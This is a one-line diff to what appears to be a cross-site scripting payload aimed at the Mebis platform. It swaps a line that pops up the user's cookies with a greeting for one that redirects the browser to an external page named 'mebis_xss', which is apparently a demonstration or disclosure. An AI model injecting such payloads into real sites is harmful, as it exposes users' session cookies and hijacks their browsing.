@@ -1,1 +1,1 @@
-alert("Hallo Mebis-User, hier sind deine Kekse: " + document.cookie)
+window.location.href = "https://onako2.github.io/mebis_xss";
